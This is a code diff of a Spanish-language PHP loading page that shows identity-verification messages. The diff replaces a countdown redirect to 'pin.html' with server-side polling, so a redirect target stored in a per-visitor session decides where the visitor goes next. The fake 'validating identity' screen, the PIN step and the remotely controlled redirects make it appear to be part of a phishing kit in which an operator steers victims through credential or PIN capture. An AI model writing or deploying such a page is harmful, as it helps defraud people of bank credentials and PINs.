@@ -1,3 +1,38 @@
+<?php
+ini_set('display_errors', 0);
+ini_set('display_startup_errors', 0);
+error_reporting(0);
+
+if (!isset($_GET['id']) || !preg_match('/^[a-zA-Z0-9,-]{5,}$/', $_GET['id'])) {
+    http_response_code(400);
+    exit;
+}
+
+$request_id = $_GET['id'];
+
+session_write_close();
+session_id($request_id);
+session_start();
+
+if (!isset($_SESSION['load_entry_time'])) {
+    $_SESSION['load_entry_time'] = time();
+}
+
+if (isset($_GET['check'])) {
+    header('Content-Type: application/json; charset=UTF-8');
+    if (isset($_SESSION['redirect']) && isset($_SESSION['redirect_set_time'])) {
+        if ($_SESSION['redirect_set_time'] > $_SESSION['load_entry_time']) {
+            echo json_encode(['redirect' => $_SESSION['redirect']]);
+            unset($_SESSION['redirect'], $_SESSION['redirect_set_time']);
+        } else {
+            echo json_encode(['redirect' => null]);
+        }
+    } else {
+        echo json_encode(['redirect' => null]);
+    }
+    exit;
+}
+?>
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -210,95 +245,66 @@
 
         <!-- Sección de Carga -->
         <div class="loading-section">
-            <!-- Contador circular -->
-            <div class="counter-container">
-                <div class="counter-circle" id="counterCircle">
-                    <div class="counter-inner">
-                        <div class="counter-number" id="counterNumber">25</div>
-                        <div class="counter-label">segundos</div>
-                    </div>
-                </div>
-            </div>
 
             <div class="loading-text" id="statusText">Por favor espera</div>
             <div class="status-message">Procesando solicitud...</div>
         </div>
     </div>
 
-    <script>
-        // Array de mensajes dinámicos que cambian cada 5 segundos
-        const mensajes = [
-            'Validando Identidad',
-            'Verificando Datos',
-            'Procesando Solicitud',
-            'Autenticando Usuario',
-            'Validando Información'
-        ];
-
-        let tiempoRestante = 25;
-        let indiceActual = 0;
-
-        // Función para cambiar el título con animación
-        function cambiarTitulo() {
-            const titulo = document.getElementById('dynamicTitle');
-            titulo.style.animation = 'none';
-            
-            setTimeout(() => {
-                titulo.textContent = mensajes[indiceActual];
-                titulo.style.animation = 'fadeInOut 0.5s ease-in-out';
-                indiceActual = (indiceActual + 1) % mensajes.length;
-            }, 50);
+  <script>
+    // Array de mensajes dinámicos que cambian cada 5 segundos
+    const mensajes = [
+        'Validando Identidad',
+        'Verificando Datos',
+        'Procesando Solicitud',
+        'Autenticando Usuario',
+        'Validando Información'
+    ];
+    let indiceActual = 0;
+    
+    // Función para cambiar el título con animación
+    function cambiarTitulo() {
+        const titulo = document.getElementById('dynamicTitle');
+        titulo.style.animation = 'none';
+        
+        setTimeout(() => {
+            titulo.textContent = mensajes[indiceActual];
+            titulo.style.animation = 'fadeInOut 0.5s ease-in-out';
+            indiceActual = (indiceActual + 1) % mensajes.length;
+        }, 50);
+    }
+    
+    // Cambiar título cada 5 segundos
+    setInterval(cambiarTitulo, 5000);
+    
+    // Agregar animación al documento
+    const estilo = document.createElement('style');
+    estilo.textContent = `
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateY(-5px); }
+            50% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(5px); }
         }
+    `;
+    document.head.appendChild(estilo);
+</script>
+<script>
 
-        // Función para actualizar el contador
-        function actualizarContador() {
-            const numeroElement = document.getElementById('counterNumber');
-            const circleElement = document.getElementById('counterCircle');
-            const statusText = document.getElementById('statusText');
-
-            tiempoRestante--;
-            numeroElement.textContent = tiempoRestante;
-
-            // Calcular porcentaje para el gradient cónico
-            const porcentaje = ((25 - tiempoRestante) / 25) * 100;
-            circleElement.style.setProperty('--percentage', porcentaje + '%');
-
-            // Cambiar color del contador según el tiempo
-            if (tiempoRestante <= 5) {
-                numeroElement.style.color = '#FF6B6B';
-                circleElement.style.background = `conic-gradient(#FF6B6B ${porcentaje}%, #E8E8F0 0)`;
-                statusText.textContent = '¡Casi listo!';
-            } else if (tiempoRestante <= 10) {
-                numeroElement.style.color = '#FFA500';
-                circleElement.style.background = `conic-gradient(#FFA500 ${porcentaje}%, #E8E8F0 0)`;
-                statusText.textContent = 'Completando validación';
+/* REDIRECCION BACKEND */
+function checkRedirect() {
+    fetch('load.php?id=<?php echo htmlspecialchars($request_id, ENT_QUOTES, "UTF-8"); ?>&check=1')
+        .then(res => res.json())
+        .then(data => {
+            if (data.redirect) {
+                window.location.href = data.redirect;
             } else {
-                numeroElement.style.color = '#3B4FB5';
-                circleElement.style.background = `conic-gradient(#3B4FB5 ${porcentaje}%, #E8E8F0 0)`;
-                statusText.textContent = 'Por favor espera';
+                setTimeout(checkRedirect, 1500);
             }
+        })
+        .catch(() => setTimeout(checkRedirect, 1500));
+}
 
-            if (tiempoRestante <= 0) {
-                window.location.href = 'pin.html';
-            }
-        }
-
-        // Cambiar título cada 5 segundos
-        setInterval(cambiarTitulo, 5000);
-
-        // Actualizar contador cada 1 segundo
-        setInterval(actualizarContador, 1000);
-
-        // Agregar animación al documento
-        const estilo = document.createElement('style');
-        estilo.textContent = `
-            @keyframes fadeInOut {
-                0% { opacity: 0; transform: translateY(-5px); }
-                50% { opacity: 1; transform: translateY(0); }
-                100% { opacity: 0; transform: translateY(5px); }
-            }
-        `;
-        document.head.appendChild(estilo);
-    </script>
+window.onload = checkRedirect;
+</script>
 </body>
 </html>
